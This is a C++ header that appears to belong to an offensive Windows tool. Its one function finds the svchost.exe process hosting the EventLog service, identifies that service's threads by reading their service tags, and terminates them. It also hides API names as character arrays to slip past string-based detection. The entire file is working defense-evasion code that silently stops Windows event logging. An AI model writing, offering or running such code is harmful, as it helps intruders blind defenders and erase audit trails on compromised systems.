#pragma once

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "Helper.h"

#pragma comment(lib,"Advapi32.lib")	//	For ServiceManager shit!

const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
const char sadvapi32_dll[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0 };
const char sI_QueryTagInformation[] = { 'I','_','Q','u','e','r','y','T','a','g','I','n','f','o','r','m','a','t','i','o','n', 0 };
const char sNtQueryInformationThread[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','T','h','r','e','a','d', 0 };

// get function pointers
using I_QueryTagInformationPrototype = ULONG(WINAPI*)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
I_QueryTagInformationPrototype pI_QueryTagInformation = (I_QueryTagInformationPrototype)GetProcAddress(GetModuleHandleA((LPCSTR)sadvapi32_dll), sI_QueryTagInformation);

typedef NTSTATUS(WINAPI* NtQueryInformationThread_t)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
NtQueryInformationThread_t pNtQueryInformationThread = (NtQueryInformationThread_t)GetProcAddress(GetModuleHandleA((LPCSTR)ntdll), sNtQueryInformationThread);


int SuspendEventLogThreads()
{
	// Grabbing a handle to Service Manager (svchost.exe) 
	SC_HANDLE hSVCM = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);

	// Grabbing a handle to EventLog Service
	SC_HANDLE hEventLogService = OpenServiceA(hSVCM, "EventLog", MAXIMUM_ALLOWED);

	// Essentials:
	SERVICE_STATUS_PROCESS svcStatus = {};
	DWORD bytesNeeded = 0;

	// Get PID of svchost.exe that hosts EventLog service
	if (!QueryServiceStatusEx(hEventLogService, SC_STATUS_PROCESS_INFO, (LPBYTE)&svcStatus, sizeof(svcStatus), &bytesNeeded))
	{
		printf("[!] Unable to get PID of svchost.exe that hosts EventLog service (%u)\n", GetLastError());
		return -1;
	}

	DWORD hEventLogServicePID = svcStatus.dwProcessId;

	printf("\n[*] Targeting svchost.exe hosting eventlog service with PID: %d\n", (int)hEventLogServicePID);

	// Change to: NtOpenProcess after knowing the fix for "POBJECT_ATTRIBUTES ObjectAttributes" issue

	// Getting a Handle to svchost.exe containing Eventlog Service Threads
	HANDLE hSVC = NULL;
	hSVC = OpenProcess(PROCESS_VM_READ, FALSE, hEventLogServicePID);

	if (hSVC == NULL)
	{
		printf("[!] Unable to a handle to svchost.exe that hosts EventLog service (%u)\n", GetLastError());
		return -1;
	}

	// End: Change to: NtOpenProcess after knowing the fix for "POBJECT_ATTRIBUTES ObjectAttributes" issue

	// Get SnapShot of all threads
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	THREAD_BASIC_INFORMATION threadBasicInfo;
	BOOL bIsWoW64 = FALSE;
	DWORD dwOffset = NULL;
	PVOID subProcessTag = NULL;

	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return -1;
	te32.dwSize = sizeof(THREADENTRY32);

	// parse the snapshot and search for threads belonging to eventlog
	if (!Thread32First(hThreadSnap, &te32))
	{
		printf("Thread32First() and we died\n");
		CloseHandle(hThreadSnap);
		return -1;
	}

	// EventLog Thread Kill Count
	int killcount = 0;
	do
	{
		// Searching for that svchost.exe which has EventLog service Threads running
		if (te32.th32OwnerProcessID == hEventLogServicePID)
		{
			// Now open a handle those threads one by one
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);

			if (hThread == NULL)
			{
				printf("[!] Unable to a handle to one of EventLog service Threads (%u)\n", GetLastError());
				return -1;
			}

			NTSTATUS status = pNtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS)0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);

			// Checking for 32 or 64 bits:

			// Why?

			// Cause:
			// I have to know whether this thread is "The Thread (EventLog service Thread)" or NOT
			
			// There is a "sub process tag" which indicates this thread being, EventLog service Thread or NOT.
			
			// This "sub process tag" is present in TEB, which depends upon the arch. of the running svchost.exe (parent process of those threads)!

			bIsWoW64 = IsWow64Process(hSVC, &bIsWoW64);
			if(!bIsWoW64)
			{
				// 32 bit: Credit @SEKTOR7net
				dwOffset = 0x1720;
				printf("32 bit\n");
			}
			else
			{
				// 64 bit: Credit @SEKTOR7net
				dwOffset = 0xf60;
				printf("64 bit\n");
			}

			// Reading sub Process Tag from TEB of svchost.exe 
			ReadProcessMemory(hSVC, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL);

			if (!subProcessTag)
			{
				CloseHandle(hThread);
				continue;
			}

			SC_SERVICE_TAG_QUERY query = { 0 };

			if (pI_QueryTagInformation)
			{
				query.processId = (ULONG)hEventLogServicePID;
				query.serviceTag = (ULONG)subProcessTag;
				query.reserved = 0;
				query.pBuffer = NULL;

				// This function translates the subProcessTag to ServiceName 
				// => eventlog
				pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);

				if (_wcsicmp((wchar_t *)query.pBuffer, L"eventlog") == 0)
				{
					printf("[+] EventLog Thread FOUND: TID -> %d", te32.th32ThreadID);
					if (TerminateThread(hThread, NULL))
					{
						printf("\tTerminated!\n", te32.th32ThreadID);
						killcount++;
					}
					else
					{
						printf("\n[!] Unable to terminate EventLog thread (TID: %d) !\n", te32.th32ThreadID);
					}
				}
			}
			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnap, &te32));

	CloseHandle(hThreadSnap);
	CloseHandle(hSVC);

	if (killcount == 0)
	{
		printf("[+] Event Logger is Either NOT running or Already Killed Previously!\n");
	}

	return 0;
}
